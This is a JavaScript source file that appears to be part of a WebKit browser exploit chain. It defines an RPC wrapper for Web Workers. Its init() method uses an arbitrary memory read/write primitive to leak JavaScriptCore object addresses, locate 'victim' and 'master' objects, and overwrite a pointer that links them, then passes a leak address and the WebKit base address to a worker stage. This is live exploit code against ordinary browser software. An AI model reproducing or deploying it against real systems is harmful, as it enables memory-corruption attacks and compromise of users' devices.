// ─── Config ──────────────────────────────────────────────────────────────────
const WORKER_TIMEOUT_MS = 45_000; // 45 s — long enough for heavy spray stages

// ─── RPCWorker ────────────────────────────────────────────────────────────────
class RPCWorker {
  constructor(name) {
    if (typeof name !== "string") {
      throw new Error(`${name} not a valid name !!`);
    }

    this.id       = 0;
    this.name     = name;
    this.transfer = [];
    this.promises = new Map();
    this.dead     = false;

    this._spawn();
  }

  _spawn() {
    this.worker = new Worker("src/worker.js");

    this.worker.onmessage = (e) => {
      const { id, type, value } = e.data || {};

      if (type === "log") {
        logger.log(value);
        return;
      }

      const p = this.promises.get(id);
      if (!p) return;
      this.promises.delete(id);
      p.clear();

      switch (type) {
        case "ret": p.resolve(value); break;
        case "err": p.reject(new Error(typeof value === "string" ? value : JSON.stringify(value))); break;
      }
    };

    // Unhandled worker errors (uncaught exceptions, OOM, network errors on
    // importScripts). Without this the worker goes silent and every pending
    // execute() hangs until its timeout fires.
    this.worker.onerror = (e) => {
      const msg = e.message ?? `Worker ${this.name} crashed`;
      logger.error(`[worker:${this.name}] ${msg}`);
      this.dead = true;

      // Reject every pending promise immediately rather than waiting for timeout.
      for (const [, p] of this.promises) {
        p.clear();
        p.reject(new Error(msg));
      }
      this.promises.clear();
    };
  }

  terminate() {
    this.dead = true;
    this.worker.terminate();

    // Drain remaining promises.
    for (const [, p] of this.promises) {
      p.clear();
      p.reject(new Error(`Worker ${this.name} terminated`));
    }
    this.promises.clear();
  }

  execute(name, ...args) {
    if (this.dead) {
      return Promise.reject(new Error(`Worker ${this.name} is dead`));
    }

    return new Promise((resolve, reject) => {
      const id = this.id++;

      let timer = setTimeout(() => {
        if (!this.promises.has(id)) return;
        this.promises.delete(id);
        reject(new Error(
          `Worker ${this.name} timed out after ${WORKER_TIMEOUT_MS / 1000}s on ${name}()`
        ));
      }, WORKER_TIMEOUT_MS);

      // Wrap resolve/reject so they also clear the timer.
      const p = {
        resolve: (v) => resolve(v),
        reject:  (v) => reject(v),
        clear:   ()  => { clearTimeout(timer); timer = null; },
      };

      this.promises.set(id, p);
      this.worker.postMessage({ id, name, args }, this.transfer);
    });
  }

  async init() {
    logger.debug(`initializing ${this.name}...`);

    const marker_arr = await this.execute("init", this.name);

    const marker_buf_data = marker_arr.buffer.data();
    logger.debug(`marker_buf_data: ${marker_buf_data}`);

    const marker_storage_addr = arw.view(marker_buf_data).getBInt(constants.marker_storage, true);
    logger.debug(`marker_storage_addr: ${marker_storage_addr}`);

    const marker_addr = arw.view(marker_storage_addr).getBInt(8, true);
    logger.debug(`marker_addr: ${marker_addr}`);

    const marker_butterfly_addr = arw.view(marker_addr).getBInt(8, true);
    logger.debug(`marker_butterfly_addr: ${marker_butterfly_addr}`);

    const marker_butterfly_prop_addr = marker_butterfly_addr.sub(0x20);
    logger.debug(`marker_butterfly_prop_addr: ${marker_butterfly_prop_addr}`);

    const victim_addr = arw.view(marker_butterfly_prop_addr).getBInt(0,    true);
    logger.debug(`victim_addr: ${victim_addr}`);

    const master_addr = arw.view(marker_butterfly_prop_addr).getBInt(8,    true);
    logger.debug(`master_addr: ${master_addr}`);

    const leak_addr   = arw.view(marker_butterfly_prop_addr).getBInt(0x10, true);
    logger.debug(`leak_addr: ${leak_addr}`);

    arw.view(master_addr).setBInt(0x10, victim_addr, true);

    await this.execute("setup", leak_addr, webkit_base);

    logger.debug(`${this.name} initialized !!`);
  }
}
